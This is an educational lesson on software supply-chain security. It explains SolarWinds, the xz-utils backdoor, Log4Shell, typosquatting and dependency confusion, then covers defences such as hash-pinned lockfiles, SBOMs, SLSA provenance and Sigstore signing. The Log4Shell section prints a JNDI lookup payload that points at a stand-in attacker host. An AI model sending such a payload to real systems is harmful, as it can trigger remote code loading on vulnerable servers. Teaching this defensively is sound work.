---
id: secp-supply-chain
title: Software supply-chain security
level: intermediate
minutes: 14
summary: How attackers compromise you through the code you didn't write and the systems that build it, told through SolarWinds, xz-utils and Log4Shell, and the defences that help: lockfiles and hashes, SBOMs, SLSA provenance and signing.
---

Applications can include many transitive dependencies beyond the ones developers select directly; actual counts vary by project. Add the compiler, the CI system, the base container image and the build scripts, and the code you wrote is a small island in a sea of code you trust without reading.

**Supply-chain attacks** target that sea. Instead of breaking into one hardened company, the attacker compromises something many companies consume, and lets the victims install the payload themselves. The attacker gets reach, and the payload arrives signed, trusted and through the front door.

## Where the chain can break

```
 source ─> build ─> package ─> consumer
   │         │         │          │
 rogue    tampered  hijacked  typosquat,
 commit   builder   registry  confusion,
                    account   vulnerable
                              dependency
```

Each arrow is a trust relationship. Three real incidents show three different links failing.

## SolarWinds: the build system (2020)

SolarWinds Orion is network-monitoring software used by thousands of large organisations, including US government departments. Attackers, later attributed by the US and UK governments to Russia's foreign intelligence service (SVR), got into SolarWinds' build environment.

They did not commit malicious code to the repository, where developers might notice it. Instead they planted a tool that CrowdStrike later named **SUNSPOT** on the build server. It watched for the `MsBuild.exe` compiler process building Orion, swapped one source file (`InventoryManager.cs`) for a backdoored version for the duration of the build, then put the original back.

The result, **SUNBURST**, was compiled into a legitimate DLL, **signed with SolarWinds' own code-signing certificate**, and shipped in Orion updates from around March to June 2020. SolarWinds initially estimated fewer than 18,000 customers might have installed affected versions. The backdoor waited roughly two weeks before calling home, and the attackers then picked a much smaller set of high-value targets for follow-on intrusion.

Lessons:

- **Code signing binds content to a signing key; it does not prove the actual builder or that the content is safe.** The signature was genuine.
- **Source review is not enough.** The source in git was clean; the build was not.
- The build system is production infrastructure and needs production-grade security.

## xz-utils: the maintainer (2024)

xz-utils is a compression library present on almost every Linux system. Its maintainer, Lasse Collin, ran it as an unpaid hobby project.

From late 2021 a contributor calling themselves **"Jia Tan"** sent helpful, ordinary patches. In 2022 several accounts, described in the linked historical reconstruction as suspected sock puppets, pressured Collin on the mailing list, complaining the project was slow and that he should hand over maintenance. Jia Tan gained commit access in late 2022 and was making releases by 2023.

In February and March 2024 Jia Tan released versions **5.6.0 and 5.6.1** containing a backdoor (**CVE-2024-3094**, CVSS 10.0). It was hidden with real care:

- The payload sat in two binary "test" files (`bad-3-corrupt_lzma2.xz`, `good-large_compressed.lzma`), whose encoded contents require additional inspection.
- The trigger was a modified `build-to-host.m4` that appeared **only in the release tarballs**, not in git.
- It activated only when building Debian or RPM packages on x86-64 Linux.
- Several distributions patch OpenSSH's `sshd` to link `libsystemd`, which links `liblzma`. The backdoor used that path to hook the server's RSA key verification, so the holder of the attacker's private key could run commands on any affected machine via SSH.

It was disclosed after a developer investigated unexpected behavior. Andres Freund, a PostgreSQL developer at Microsoft, noticed SSH logins on Debian unstable using unusual CPU (a failed login went from about 0.3 s to 0.8 s) and Valgrind errors, investigated, and disclosed it on 29 March 2024. The backdoored versions had reached Fedora Rawhide, Fedora 40 beta and Debian unstable and testing, primarily in prerelease distributions at disclosure; exact affected distributions and build conditions must be checked against their advisories.

Lessons:

- **The release artefact must match the source.** For the disclosed release-only trigger, building from the corresponding git source bypassed that trigger; this is not a general guarantee that git contents are safe.
- **Maintainer burnout is a security problem.** Critical infrastructure maintained by one tired volunteer is a soft target for social engineering.
- **Binary blobs need different review techniques.** Their purpose, generation process and decoded contents can be examined; they are not inherently unreviewable.

## Log4Shell: the vulnerable dependency (2021)

Not every supply-chain incident involves an attacker in the chain. **Log4Shell** (CVE-2021-44228, December 2021, CVSS 10.0) was a vulnerability in Log4j Core, a widely used Java logging component; it was not itself evidence of a malicious upstream implant.

Log4j supported *lookups*: `${...}` expressions inside log messages that were expanded at log time. One lookup was JNDI, which can fetch and load a Java object from a remote LDAP server. In vulnerable lookup paths and runtime configurations, attacker-controlled logged input could trigger a remote lookup, for example:

```
${jndi:ldap://evil.example/a}
```

The vulnerable path could contact an attacker LDAP endpoint and enable code execution, depending on runtime and reachable exploitation paths. The original advisory affected Log4j Core 2.0-beta9 through 2.14.1; `log4j-api` alone and Log4j 1.x are different cases.

The hard part for defenders was not the fix but the question **"where do we run Log4j?"** It was usually a **transitive** dependency, pulled in by a framework, inside a fat JAR, inside a vendor appliance. Fixes also came in waves: 2.15.0, then 2.16.0 and 2.17.0 for follow-up CVEs, then 2.17.1, so teams had to find everything more than once.

## Attacks on the package ecosystem

Besides those three, you should recognise these patterns:

- **Typosquatting**: publishing `reqeusts` or `python-dateutils` and waiting for typos. Removal counts vary; the risk is selecting an attacker-controlled lookalike name.
- **Account takeover**: stealing a maintainer's registry credentials and publishing a malicious version of a real package (the npm package `ua-parser-js` in 2021 shipped a cryptominer this way).
- **Handover**: offering to maintain an abandoned package. In 2018 the npm `event-stream` package was handed to a new maintainer who added a dependency that targeted one Bitcoin wallet app.
- **Dependency confusion**: in 2021 Alex Birsan found internal package names (from leaked `package.json` files and similar) at Apple, Microsoft, PayPal and over 30 other companies, published packages with those names and higher version numbers to the public registries, and their build systems installed the public ones.

> [!warning] Why dependency confusion works with pip
> With `pip install --extra-index-url https://pypi.internal ...`, pip gives indexes no priority and selects the best compatible candidate under its version constraints and resolver rules. If `acme-auth` is 1.4 internally and an attacker publishes `acme-auth` 99.0 on PyPI, pip can choose 99.0 when both candidates are compatible and no other constraints or installed-state decisions change selection. Use a single `--index-url` pointing at a proxy that serves your internal names exclusively, and pin hashes.

## Defences

### Know what you run: lockfiles and SBOMs

A **lockfile** (`poetry.lock`, `package-lock.json`, `requirements.txt` from `pip-compile`) records resolved dependency choices; complete reproducibility also depends on platform markers, artifacts, installer behavior and how the lockfile is enforced. With **hashes**, the installer also refuses an artefact whose content differs from what you reviewed:

```
# requirements.txt
requests==2.32.3 \
  --hash=sha256:70761c...  # truncated
```

```
pip install --require-hashes \
  -r requirements.txt
```

A **software bill of materials (SBOM)** is a machine-readable component inventory whose completeness depends on generation scope and metadata quality, in **SPDX** or **CycloneDX** format. US Executive Order 14028 (May 2021) pushed SBOMs into federal procurement. With SBOMs stored per release, "where do we run Log4j?" becomes a query:

```python
import json

def check(path):
    with open(path) as f:
        sbom = json.load(f)
    for c in sbom.get("components", []):
        if c.get("name") != "log4j-core":
            continue
        # Candidates, not CVE verdicts.
        ver = c.get("version", "unknown")
        print(path, ver)
```

This simplified CycloneDX-style inventory lists candidate components, not vulnerability verdicts. Match full package identity and version against the applicable advisory, including backport branches and prereleases; then assess configuration/reachability. A blanket `<2.17.1` check would misclassify backported fixes and later advisories.

> [!note] Content gap
> Universal inventory-response times and relative incident-frequency claims are omitted because no comparable measurement dataset was available.

### Know it hasn't been tampered with: provenance and SLSA

**SLSA** ("salsa", Supply-chain Levels for Software Artifacts) is an OpenSSF framework. Its **Build track** has levels:

| Level | Requirement | Intended benefit |
|---|---|---|
| L1 | Provenance exists | Traceability; no intrinsic tamper resistance |
| L2 | Authenticated provenance, hosted build | Detect substitution when provenance is verified against policy |
| L3 | Hardened, isolated build | Stronger resistance to cross-build influence and provenance forgery |

**Provenance** records how an artifact was produced; authentication/signing depends on the required level and delivery mechanism. A statement may say: "artefact with hash X was built from commit Y of repo Z by builder B with these parameters". A consumer can verify that the package came from the expected source and builder. SLSA v1.2 adds a Source track covering how code gets into the repository.

How the incidents map:

- **SolarWinds** was tampering *during* the build, the threat Build L3 targets: stronger isolation and protected provenance generation. The build platform remains trusted; an arbitrary compromise of that trusted platform is not automatically excluded by a level label.
- **xz-utils** shipped a tarball that did not match the git source. Provenance tied to a reviewed source policy, or independent reproducible builds with known inputs, can expose unexpected source-to-artifact differences. Provenance alone can truthfully describe a malicious tarball build. But SLSA would *not* stop a trusted maintainer committing malicious code; that needs review, which is why the binary test files mattered.
- **Log4Shell** was a genuine bug; SLSA doesn't help, SBOMs and SCA do.

### Signing

**Sigstore** (with its `cosign` tool) lets CI sign artefacts with short-lived certificates tied to an OIDC identity ("built by this GitHub Actions workflow in this repo"), and records signatures in a public transparency log. npm and PyPI now support provenance attestations based on this. Remember SolarWinds: signing tells you *who*, so verify the identity is the one you expect.

### Choose and limit dependencies

- Prefer fewer, well-maintained dependencies. **OpenSSF Scorecard** rates projects on branch protection, code review, signed releases and more.
- Let **Dependabot** or **Renovate** raise update PRs, but weigh observation delays for untrusted new releases against the urgency of security fixes; no fixed waiting period guarantees safety.
- Run SCA (`pip-audit`, `npm audit`, Dependabot alerts) in CI.
- Use private registries or proxies, and reserve your internal package names (or use npm scopes such as `@acme/`).

> [!tip] Trade-off: pinning versus patching
> Strict pinning with enforced artifact hashes avoids automatically selecting a different new release, but leaves you on vulnerable old versions unless something prompts an update. Pin *and* automate updates, so changes are deliberate, reviewed and frequent.

## Key takeaways
- Supply-chain attacks compromise something many victims consume, so the payload arrives trusted and often signed.
- SolarWinds compromised the build server, xz-utils compromised the maintainer and release tarball, and Log4Shell was a bug in a ubiquitous transitive dependency.
- Lockfiles with hashes and SBOMs answer "what exactly do we run?", which was the hard question during Log4Shell.
- SLSA provenance and hardened builds address tampering between source and artefact; they do not stop a malicious trusted maintainer.
- Signatures bind an artifact to a signing key/validated identity, not safety or independently verified build execution; enforce the expected signer and provenance policy.
- Dependency confusion and typosquatting exploit how package managers resolve names; use a single trusted index and reserved names.

## Further reading
- [SLSA specification: levels](https://slsa.dev/spec/v1.2/)
- [CISA: Software Bill of Materials](https://www.cisa.gov/sbom)
- [Andres Freund's xz-utils disclosure (oss-security)](https://www.openwall.com/lists/oss-security/2024/03/29/4)
- [Timeline of the xz open source attack — Russ Cox](https://research.swtch.com/xz-timeline)
- [SUNSPOT technical analysis — CrowdStrike](https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/)
- [Apache Log4j security vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [pip: secure installs and hash-checking mode](https://pip.pypa.io/en/stable/topics/secure-installs/)
- [Sigstore documentation](https://docs.sigstore.dev/)
